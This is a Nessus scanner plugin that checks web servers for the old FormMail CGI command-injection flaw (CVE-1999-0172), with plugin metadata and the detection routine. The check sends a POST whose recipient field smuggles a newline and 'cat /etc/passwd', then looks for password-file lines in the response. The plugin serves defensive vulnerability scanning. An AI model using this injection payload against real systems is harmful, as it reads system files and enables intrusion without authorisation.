#
# This script was written by Mathieu Perrin <mathieu@tpfh.org>
#
# See the Nessus Scripts License for details

# Changes by Tenable:
# - Revised plugin title, added OSVDB ref (4/16/009)
# - better egrep (2009-11-19)


include("compat.inc");

if(description)
{
 script_id(10076);
 script_version ("$Revision: 1.30 $");
 script_cve_id("CVE-1999-0172");
 script_bugtraq_id(2079);
 script_osvdb_id(66);
 
 script_name(english:"Matthew Wright FormMail CGI (formmail.cgi) Arbitrary Mail Relay");

 script_set_attribute(attribute:"synopsis", value:
"Arbirtrary commands might be run on the remote host." );
 script_set_attribute(attribute:"description", value:
"The 'formmail.pl' is installed. This CGI has a well known security flaw
that lets anyone execute arbitrary commands with the privileges of the
HTTP daemon (root or nobody)." );
 script_set_attribute(attribute:"solution", value:
"Remove it from /cgi-bin." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");

 script_set_attribute(attribute:"plugin_publication_date", value: "1999/12/01");
 script_set_attribute(attribute:"vuln_publication_date", value: "1995/08/02");
 script_cvs_date("$Date: 2011/03/11 21:52:33 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();

 script_summary(english:"Checks for the presence of /cgi-bin/formmail.pl");
 script_category(ACT_GATHER_INFO);
 script_copyright(english:"This script is Copyright (C) 1999-2011 Mathieu Perrin");
 script_family(english:"CGI abuses");
 script_dependencie("find_service1.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 
 exit(0);
}	  

#
# The script code starts here
#
include("http_func.inc");

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);
if( get_kb_item("Services/www/" + port + "/embedded") ) exit(0);


foreach dir (cgi_dirs())
{
  a = string("POST ", dir, "/formmail.pl HTTP/1.0\r\n");
  aa = string("POST ", dir, "/formmail HTTP/1.0\r\n");

  b = string("Content-length: 120\r\n\r\n");
  c = string("recipient=root@localhost%0Acat%20/etc/passwd&email=nessus@localhost&subject=test\r\n\r\n");
  d = crap(200);
  soc = http_open_socket(port);
  if(soc)
  {
    req1 = a+b+c+d;
    send(socket:soc, data:req1);
    r = http_recv(socket:soc);
    http_close_socket(soc);
    if (egrep(string:r, pattern: "root:.*:0:0:.*:.*:"))
    {
      security_hole(port);
      exit(0);
    }

    soc2 = http_open_socket(port);
    if(!soc2)exit(0);
    req2 = aa+b+c+d;
    send(socket:soc2, data:req2);
    r2 = http_recv(socket:soc2);
    http_close_socket(soc2);
    if(egrep(string:r2, pattern: "root:.*:0:0:.*:.*:"))
    {
      security_hole(port);
      exit(0);
    }
   }
}
   
